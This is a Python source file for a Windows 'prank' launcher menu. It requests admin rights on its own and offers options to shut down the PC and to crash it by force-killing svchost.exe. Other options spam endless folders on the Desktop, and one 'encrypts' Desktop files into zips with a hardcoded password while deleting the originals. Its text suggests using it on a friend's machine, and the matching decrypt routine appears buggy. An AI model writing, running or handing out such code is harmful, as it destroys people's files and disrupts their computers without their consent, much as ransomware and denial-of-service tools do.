from pygame import mixer  
import time
import os
import subprocess
from random import randint
import sys
import ctypes
import string
import pyminizip
import random
from zipfile import ZipFile
from tqdm import tqdm

# resize of the launcher/console
os.system('mode con: cols=80 lines=16')   



def countdown(t):
    
    while t:
        mins, secs = divmod(t, 60)
        timer = '                                     {:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1

def check_admin():
    
    try:
        isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()

def folderSpam():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    i = 1
    while True:
        new_folder = "Get-Fucked!"+str(i)
        folder_path = os.path.join(desktop, new_folder)
        os.mkdir(folder_path)
        i += 1

def random_char(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))

def getFucked():
    for filename in os.listdir(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')):
        time.sleep(0.00001)
        new_name = random_char(25)+".rat"
        if os.path.isfile(filename):
            if filename != os.path.basename(__file__):
                if "." in filename:
                    print("                                 Encrypted:  " + filename)
                time.sleep(0.5) 
                os.system('cls') 
                #os.rename(filename, new_name)
                inpt = filename
                pre = None
                oupt = new_name
                password = "CJHAKLGHJLKASJKGFHJKAHDJSKHDJKASHDJKASDHSAJKDHDJK"
                com_lvl = 5
                pyminizip.compress(inpt, None, oupt, password, com_lvl)
                os.remove(filename)

def getUnFucked():
    for filename in os.listdir(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')):
        if filename != os.path.basename(__file__):
            if filename[33:] != "rat":
                str_zipFile = filename
                str_pwd= 'CJHAKLGHJLKASJKGFHJKAHDJSKHDJKASHDJKASDHSAJKDHDJK'
            try:
              with ZipFile(str_zipFile) as zipObj:
                zipObj.extractall(pwd = bytes(str_pwd,'utf-8'))
              time.sleep(0.1)
              os.remove(filename)
            except:
                print("                                 could not decrypt: "+filename)

def begin(): # UI for selecting an option
    print("")
    print("\033[1;35;40m                       ╔══════════════════════════════╗")
    print("\033[1;35;40m                       ║                              ║")
    print("\033[1;35;40m                       ║    [1]: Schutdown Pc         ║")
    print("\033[1;35;40m                       ║                              ║")
    print("\033[1;35;40m                       ║    [2]: Crash Pc             ║")
    print("\033[1;35;40m                       ║                              ║")
    print("\033[1;35;40m                       ║    [3]: Fake Crash Pc        ║")
    print("\033[1;35;40m                       ║                              ║")
    print("\033[1;35;40m                       ║    [4]: Folder Spammer       ║")
    print("\033[1;35;40m                       ║                              ║")
    print("\033[1;35;40m                       ║    [5]: Next Page            ║")
    print("\033[1;35;40m                       ║                              ║")
    print("\033[1;35;40m                       ╚══════════════════════════════╝")
    t = input("\033[1;35;40m                             Choose an option > ")

    hoi = 17 #Amout of seconds in the timer (Dont change if u want to match te song perfectly!)  
        
    # The UI used in the launcher!

    if t == "1":
        time.sleep(1)
        mixer.init()
        mixer.music.load('outro.mp3')
        mixer.music.play()
        os.system('cls')
        print("")
        print("")
        print("")
        print("")
        print("")
        print("\033[1;35;40m                        ╔══════════════════════════════╗")
        print("\033[1;35;40m                        ║                              ║") 
        print("\033[1;35;40m                        ║    Shutting down your pc.    ║")
        print("\033[1;35;40m                        ║                              ║")
        print("\033[1;35;40m                        ╚══════════════════════════════╝")
        print("")                
        countdown(int(hoi))                           
        os.system("shutdown /s /t 1")

    elif t == "2": # Crash pc code
        time.sleep(1)
        mixer.init()
        mixer.music.load('outro.mp3')
        mixer.music.play()
        os.system('cls')
        print("")
        print("")
        print("")
        print("")
        print("") 
        print("\033[1;35;40m                        ╔══════════════════════════════╗")
        print("\033[1;35;40m                        ║                              ║") 
        print("\033[1;35;40m                        ║       Crashing your pc.      ║")
        print("\033[1;35;40m                        ║                              ║")
        print("\033[1;35;40m                        ╚══════════════════════════════╝")
        print("")                
        countdown(int(hoi))
        os.system("taskkill /F /IM svchost.exe")

    elif t == "3": # Fake crash your pc
        time.sleep(1)
        os.system('cls')
        print("")
        print("")
        print("")
        print("")
        print("")
        print("\033[1;35;40m                        ╔══════════════════════════════╗")
        print("\033[1;35;40m                        ║                              ║") 
        print("\033[1;35;40m                        ║    Triggering Fake Crash.    ║")
        print("\033[1;35;40m                        ║                              ║")
        print("\033[1;35;40m                        ╚══════════════════════════════╝")
        time.sleep(2)
        #p = str(f"{os.path.dirname(__file__)}/bat/bsod.bat")
        #subprocess.Popen(p)
        fp = str(f"{os.path.dirname(__file__)}/bat/bsod.bat")
        p = subprocess.Popen([fp])
        time.sleep(1)
        p.terminate()
        exit()

    elif t == "4":
        os.system('cls')
        print("")
        print("")
        print("")
        print("")
        print("")
        print("\033[1;35;40m          ╔══════════════════════════════════════════════════════════╗")
        print("\033[1;35;40m          ║ NOTE: This function will create about 200 folders        ║") 
        print("\033[1;35;40m          ║ on your desktop or your friend's desktop! You have       ║")
        print("\033[1;35;40m          ║ 10 Seconds to close te program! Coninue at your own risk ║")
        print("\033[1;35;40m          ╚══════════════════════════════════════════════════════════╝")
        time.sleep(5)
        os.system('cls')
        print("\033[1;35;40m                        ╔══════════════════════════════╗")
        print("\033[1;35;40m                        ║                              ║") 
        print("\033[1;35;40m                        ║  Creating infinite Folders.  ║")
        print("\033[1;35;40m                        ║                              ║")
        print("\033[1;35;40m                        ╚══════════════════════════════╝")
        folderSpam()

    elif t == "5":
        os.system('cls')
        print("")
        print("\033[1;35;40m                       ╔══════════════════════════════╗")
        print("\033[1;35;40m                       ║                              ║")
        print("\033[1;35;40m                       ║    [6]: File Encrypter       ║")
        print("\033[1;35;40m                       ║                              ║")
        print("\033[1;35;40m                       ║    [7]: File Decrypter       ║")
        print("\033[1;35;40m                       ║                              ║")
        print("\033[1;35;40m                       ║    [8]: Exit Program         ║")
        print("\033[1;35;40m                       ║                              ║")
        print("\033[1;35;40m                       ║    [9]: Coming Soon!         ║")
        print("\033[1;35;40m                       ║                              ║")
        print("\033[1;35;40m                       ║    [0]: Previous Page        ║")
        print("\033[1;35;40m                       ║                              ║")
        print("\033[1;35;40m                       ╚══════════════════════════════╝")
        t = input("\033[1;35;40m                            Choose an option > ")
        if t == "0":
            os.system('cls')
            begin()

    elif t == "8":
        os.system('cls')
        print("")
        print("")
        print("")
        print("")
        print("")
        print("\033[1;31;40m                                   Exiting...")
        time.sleep(3)
        exit()

    elif t == "6":
        os.system('cls')
        print("\033[1;35;40m          ╔══════════════════════════════════════════════════════════╗")
        print("\033[1;35;40m          ║ NOTE: This function will replace your entire desktop     ║") 
        print("\033[1;35;40m          ║ apps to encrypted files, use this option at your own     ║")
        print("\033[1;35;40m          ║ risk! you got 5 seconds before it's gonna encrypt!       ║")
        print("\033[1;35;40m          ╚══════════════════════════════════════════════════════════╝")
        time.sleep(7)
        os.system('cls')
        print("\033[1;35;40m                        ╔══════════════════════════════╗")
        print("\033[1;35;40m                        ║                              ║") 
        print("\033[1;35;40m                        ║   Encrypting Desktop Apps.   ║")
        print("\033[1;35;40m                        ║                              ║")
        print("\033[1;35;40m                        ╚══════════════════════════════╝")
        time.sleep(3)
        getFucked()

    elif t == "7":
        os.system('cls')
        print("\033[1;35;40m          ╔══════════════════════════════════════════════════════════╗")
        print("\033[1;35;40m          ║ NOTE: This function will replace your entire desktop     ║") 
        print("\033[1;35;40m          ║ apps to Decrypted files! use this option at your own     ║")
        print("\033[1;35;40m          ║ risk! you got 5 seconds before it's gonna decrypt!       ║")
        print("\033[1;35;40m          ╚══════════════════════════════════════════════════════════╝")
        time.sleep(7)
        os.system('cls')
        print("\033[1;35;40m                        ╔══════════════════════════════╗")
        print("\033[1;35;40m                        ║                              ║") 
        print("\033[1;35;40m                        ║   Decrypting Desktop Apps.   ║")
        print("\033[1;35;40m                        ║                              ║")
        print("\033[1;35;40m                        ╚══════════════════════════════╝")
        time.sleep(3)
        getUnFucked()

    else: # if the wrong input is given the program will shut off.
        os.system('cls')
        print("")
        print("")
        print("")
        print("")
        print("")
        for i in tqdm(range(25),desc="    Loading Menu", ncols=75):
            time.sleep(0.1)
        os.system('cls')
        begin()

check_admin() # checking for admin, and validating for the PC crash
os.system('cls')


print("")
print("")
print("")
print("")
print("")
for i in tqdm(range(25),desc="\033[1;35;40m    Loading Application", ncols=75):
    time.sleep(0.1)
os.system('cls')
begin()



